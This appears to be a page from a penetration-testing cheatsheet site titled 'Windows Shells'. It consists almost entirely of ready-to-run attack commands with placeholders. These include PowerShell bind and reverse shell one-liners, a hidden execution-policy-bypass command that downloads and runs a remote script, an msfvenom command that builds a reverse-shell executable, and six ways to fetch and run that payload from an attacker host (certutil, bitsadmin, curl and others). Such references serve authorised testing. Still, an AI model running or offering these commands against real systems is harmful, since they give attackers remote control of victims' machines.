---
layout: default
parent: Windows
grand_parent: Pentest Cheatsheets
title: Windows Shells
nav-order: 1
---

<details open markdown="block">
  <summary>
    Table of contents
  </summary>
  {: .text-delta }
1. TOC
{:toc}
</details>

**Powershell**
==========

**Bind Shell Single Line**
--------------

<details>
<summary><u>On Target</u></summary>
<p>
BIND_PORT - Port to listen on target for connection in
</p>
</details>


```
powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',BIND_PORT);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"  
```

<details>
<summary><u>Locally</u></summary>
<p>
TARGET_IP - IP where you need to connect to listener (actual or proxied)
<br>
BIND_PORT - Port to connect to reach listener
</p>
</details>

```
nc TARGET_IP BIND_PORT
```

**Reverse Shell Single Line**
-----------------------------

<details>
<summary><u>Locally</u></summary>
<p>
REVERSE_PORT - Port you want to open to receive a callback
</p>
</details>

```
nc -nlvp REVERSE_PORT
```

<details>
<summary><u>On Target</u></summary>
<p>
REVERSE_IP - Where target needs to send connection to reach your listener
REVERSE_PORT - Port target needs to send connection to reach listener
</p>
</details>

```
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('REVERSE_IP',REVERSE_PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

**Reverse Shell w/ IEX**
---------------------


<details>
<summary><u>Locally</u></summary>
<p>
MY_WEBPORT - Port of web server on your host
<br>
REVERSE_PORT - Port target will be hitting on host to get reverse shell
</p>
</details>

```
python3 -m http.server MY_WEBPORT
nc -nlvp REVERSE_PORT
```

<details>
<summary><u>On Target</u></summary>
<p>
REVERSE_PORT - Port to listen for connection in
<br>
MY_WEBPORT - Port of web server on your host
<br>
MY_SCRIPT - Name of script you are hosting that powershell will execute to get the reverse shell.
</p>
</details>

```
powershell.exe -executionpolicy bypass -w hidden "iex(New-Object System.Net.WebClient).DownloadString('http://REVERSE_IP:MY_WEBPORT/MY_SCRIPT.ps1'); MY_SCRIPT.ps1"
```

**Generic**
===========

**Reverse via http**
---------------------

<details>
<summary><u>Locally</u></summary>
<p>
REVERSE_IP - IP target will be connecting to send reverse shell
<br>
REVERSE_PORT - Port host will open to recieve reverse shell
<br>
EVILEXE - name of EXE
</p>
</details>

```
nc -nlvp REVERSE_PORT
msfvenom -p windows/shell_reverse_tcp LHOST=REVERSE_IP LPORT=REVERSE_PORT –f exe -o EVILEXE.exe
python3 -m http.server MY_WEBPORT
```

<details>
<summary><u>On Target</u></summary>
<p>
REVERSE_IP - IP target will be connecting to send reverse shell
<br>
REVERSE_PORT - Port host will open to recieve reverse shell
<br>
EVILEXE - name of EXE
</p>
</details>

```
\\POWERSHELL IWR
Invoke-WebRequest -Uri http://REVERSE_IP:MY_WEBPORT/EVILEXE.exe -OutFile EVILEXE.exe
EVILEXE.exe

\\POWERSHELL Webclient
(New-Object System.Net.WebClient).DownloadFile(http://REVERSE_IP:MY_WEBPORT/EVILEXE.exe, EVILEXE.exe)
EVILEXE.exe

\\POWERSHELL BitsTransfer
Start-BitsTransfer -Source http://REVERSE_IP:MY_WEBPORT/EVILEXE.exe -Destination EVILEXE.exe
EVILEXE.exe

\\WIN10 curl.exe
curl.exe --output EVILEXE.exe --url http://REVERSE_IP:MY_WEBPORT/EVILEXE.exe
EVILEXE.exe

\\WINXP+ bitsadmin
bitsadmin /transfer myDownloadJob /download /priority normal http://REVERSE_IP:MY_WEBPORT/EVILEXE.exe EVILEXE.exe
EVILEXE.exe

\\WINVISTA+ certutil
certutil.exe -urlcache -split -f "http://REVERSE_IP:MY_WEBPORT/EVILEXE.exe" EVILEXE.exe
EVILEXE.exe
```
